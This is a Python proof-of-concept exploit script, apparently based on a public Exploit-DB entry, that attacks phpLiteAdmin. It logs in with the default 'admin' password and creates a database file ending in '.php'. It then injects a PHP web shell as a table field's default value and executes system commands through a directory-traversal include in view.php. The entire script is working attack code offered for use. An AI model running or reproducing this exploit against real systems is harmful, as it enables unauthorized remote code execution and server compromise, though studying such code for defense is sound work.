#!/usr/bin/env python
# phplightadmin.py - phpLiteAdmin postauth RCE poc
#
# based on public bug + default credentials (EDB-ID: 24044)
# 24.02.2019@12:38
#

import requests
import sys

target = 'http://' + sys.argv[1]
full_url = target + '/dbadmin/test_db.php'

login_data = {
  'password':'admin',
  'rememberme':'yes',
  'login':'Log In'
}

sess = requests.session()
req = sess.post(full_url, data=login_data)
resp = req.text

if 'Documentation' in resp:
  print '[+] admin user logged-in!'
  print '[i] preparing shell DB'

  createNewDbLink = target + '/dbadmin/test_db.php'
  createPostDB = {
    'new_dbname':'shellme5.php',
    'submit':'Create'
  }

  do_create = sess.post(createNewDbLink, data=createPostDB)
  createResp = do_create.text

  if 'shellme5.php' in createResp:
    print '[+] shell created!!'

    # geto to create table
    init_table = target + '/dbadmin/test_db.php?switchdb=/usr/databases/shellme5.php'
    init_req = sess.get(init_table)
    init_resp = init_req.text

    # creating table
    table_link = target + '/dbadmin/test_db.php?action=table_create'
    table_data = {
      'tablename':'testing1',
      'tablefields':'1',
      'createtable':'Go'
    }
    do_table = sess.post(table_link, data=table_data)
    do_tableResp = do_table.text

    if 'Creating new table' in do_tableResp:
      print '[+] looks like table is created. so far so good!'

      # inject phpcode
      inphplink = target + '/dbadmin/test_db.php?action=table_create&confirm=1'
      inphplink_data = {
        'tablename':'testing1',
        'rows':'1',
        '0_field':'sasasasasasasasasasasa',
        '0_type':'INTEGER',
        '0_defaultvalue':'<? echo shell_exec($_GET[xxx]);?>'
      }
      inphpdo = sess.post(inphplink, data=inphplink_data)
      inphpdoresp = inphpdo.text

      if 'has been created' in inphpdoresp:
        print '[+] table injected; check your shell now...'

        verifymishell = sess.get(target + '/view.php?page=../../../../../../../../../usr/databases/shellme5.php&xxx=id')
        cmdresp = verifymishell.text

        print ']:>'
        print ''
        print cmdresp
        print ''
        print ']:>'


  print '\n[+] script finished.'

# topa
# 